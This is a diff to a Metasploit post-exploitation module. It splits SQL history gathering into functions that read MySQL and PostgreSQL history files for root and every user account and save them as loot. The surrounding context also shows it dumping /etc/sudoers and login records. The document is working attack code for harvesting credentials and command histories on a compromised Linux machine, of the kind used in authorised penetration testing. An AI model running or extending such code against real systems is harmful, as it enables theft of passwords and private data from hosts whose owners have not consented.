@@ -47,7 +47,8 @@ class Metasploit3 < Msf::Post
     shells.each do |shell|
       get_shell_history(users, user, shell)
     end
-    get_sql_history(users, user)
+    get_mysql_history(users, user)
+    get_psql_history(users, user)
     get_vim_history(users, user)
     last = execute("/usr/bin/last && /usr/bin/lastlog")
     sudoers = cat_file("/etc/sudoers")
@@ -109,25 +110,45 @@ class Metasploit3 < Msf::Post
     end
   end
 
-  def get_sql_history(users, user)
+  def get_mysql_history(users, user)
     if user == "root" and users != nil
       users = users.chomp.split()
       users.each do |u|
         if u == "root"
-          vprint_status("Extracting SQL history for #{u}")
+          vprint_status("Extracting MySQL history for #{u}")
           sql_hist = cat_file("/root/.mysql_history")
         else
-          vprint_status("Extracting SQL history for #{u}")
+          vprint_status("Extracting MySQL history for #{u}")
           sql_hist = cat_file("/home/#{u}/.mysql_history")
         end
-
-        save("History for #{u}", sql_hist) unless sql_hist.nil? || sql_hist =~ /No such file or directory/
+        save("MySQL History for #{u}", sql_hist) unless sql_hist.nil? || sql_hist =~ /No such file or directory/
       end
     else
-      vprint_status("Extracting SQL history for #{user}")
+      vprint_status("Extracting MySQL history for #{user}")
       sql_hist = cat_file("/home/#{user}/.mysql_history")
       vprint_status(sql_hist) if sql_hist
-      save("SQL History for #{user}", sql_hist) unless sql_hist.nil? || sql_hist =~ /No such file or directory/
+      save("MySQL History for #{user}", sql_hist) unless sql_hist.nil? || sql_hist =~ /No such file or directory/
+    end
+  end
+
+  def get_psql_history(users, user)
+    if user == "root" and users != nil
+      users = users.chomp.split()
+      users.each do |u|
+        if u == "root"
+          vprint_status("Extracting PostgreSQL history for #{u}")
+          sql_hist = cat_file("/root/.psql_history")
+        else
+          vprint_status("Extracting PostgreSQL history for #{u}")
+          sql_hist = cat_file("/home/#{u}/.psql_history")
+        end
+        save("PostgreSQL History for #{u}", sql_hist) unless sql_hist.blank? || sql_hist =~ /No such file or directory/
+      end
+    else
+      vprint_status("Extracting PostgreSQL history for #{user}")
+      sql_hist = cat_file("/home/#{user}/.psql_history")
+      vprint_status(sql_hist) if sql_hist
+      save("PostgreSQL History for #{user}", sql_hist) unless sql_hist.blank? || sql_hist =~ /No such file or directory/
     end
   end
 
